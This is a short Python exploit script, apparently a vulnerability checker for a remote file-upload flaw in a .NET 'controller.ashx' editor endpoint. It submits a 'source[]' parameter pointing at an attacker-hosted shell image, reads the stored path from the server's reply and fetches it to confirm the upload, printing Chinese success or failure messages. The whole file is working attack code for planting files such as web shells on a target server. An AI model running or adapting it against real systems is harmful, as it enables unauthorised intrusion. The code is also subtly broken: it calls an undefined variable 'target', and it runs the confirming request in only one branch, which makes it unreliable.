import requests
import re
import sys
import webbrowser
import  time


def verify(url, shellpath):
    photo_shell = shellpath
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1'
        }
    req = requests.post(url=url,headers=headers,data='source[]='+photo_shell,verify=False, timeout=20)
    try:
        info = req.json()
    except:
        return ""
    print(info)
    if info['state'] == 'SUCCESS' and info['list'][0]['url'] != None:
        path = info['list'][0]['url']
        if re.search('^/', path):
            shellpath = "/".join(url.split("/")[:3]) + path
        else:
            shellpath = url.replace("controller.ashx" ,info['list'][0]['url'])
            req2 = requests.get(shellpath, headers=headers, verify=False, timeout=20)
            if req2.status_code == 200 and "VulnTest" in req2.text:
                return shellpath
    return ""
    

if __name__=="__main__":
    url = sys.argv[1]
    imgpath = sys.argv[2]
    info = verify(target, imgpath)
    if info != "":
        print("[+]漏洞存在，文件上传的地址为：", info)
    else:
        print("[-]漏洞不存在")
